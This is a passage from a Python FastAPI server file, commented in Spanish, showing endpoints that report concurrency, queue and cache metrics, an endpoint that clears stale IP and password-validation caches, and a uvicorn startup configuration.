            "telegram_queue_size": telegram_queue.qsize()
        },
        "semaphore_stats": {
            "available_requests": request_semaphore._value,
            "available_db": db_semaphore._value,
            "available_http": http_semaphore._value
        }
    }

@app.get("/metrics")
async def get_metrics():
    """Endpoint para métricas del sistema"""
    return {
        "concurrency_limits": {
            "max_concurrent_requests": MAX_CONCURRENT_REQUESTS,
            "max_db_connections": MAX_DB_CONNECTIONS,
            "max_http_connections": MAX_HTTP_CONNECTIONS
        },
        "current_usage": {
            "active_requests": MAX_CONCURRENT_REQUESTS - request_semaphore._value,
            "active_db_connections": MAX_DB_CONNECTIONS - db_semaphore._value,
            "active_http_connections": MAX_HTTP_CONNECTIONS - http_semaphore._value
        },
        "queues": {
            "background_queue_size": background_queue.qsize(),
            "background_queue_maxsize": background_queue.maxsize,
            "telegram_queue_size": telegram_queue.qsize(),
            "telegram_queue_maxsize": telegram_queue.maxsize
        },
        "cache_info": {
            "ip_cache_size": len(ip_cache),
            "blocked_ips_cache_size": len(blocked_ips_cache),
            "ip_number_cache_size": len(ip_number_cache),
            "user_cache_size": len(user_cache)
        },
        "deques": {
            "cola_size": len(cola),
            "baneado_size": len(baneado)
        }
    }

@app.post("/clear_caches")
async def clear_caches():
    """Endpoint para limpiar caches manualmente"""
    global ip_cache, cache_last_updated
    
    # Limpiar caches que pueden crecer mucho
    old_ip_cache_size = len(ip_cache)
    current_time = time.time()
    
    # Limpiar cache de IPs viejas
    old_keys = [k for k, (_, t) in ip_cache.items() if current_time - t > CACHE_TTL * 2]
    for k in old_keys:
        ip_cache.pop(k, None)
    
    # Limpiar cache de validación de contraseñas
    validar_contrasena_cached.cache_clear()
    
    return {
        "message": "Caches limpiados",
        "stats": {
            "ip_cache_before": old_ip_cache_size,
            "ip_cache_after": len(ip_cache),
            "keys_removed": len(old_keys)
        }
    }

if __name__ == "__main__":
    import uvicorn
    
    # Configuración optimizada para producción
    config = uvicorn.Config(
        app=app,
        host="0.0.0.0",
        port=8000,
        workers=1,  # Para evitar problemas con estado compartido
        loop="asyncio",
        http="httptools",
        lifespan="on",
        access_log=False,  # Desactivar para mejor rendimiento
        server_header=False,
        date_header=False
    )
    
    server = uvicorn.Server(config)
    server.run()
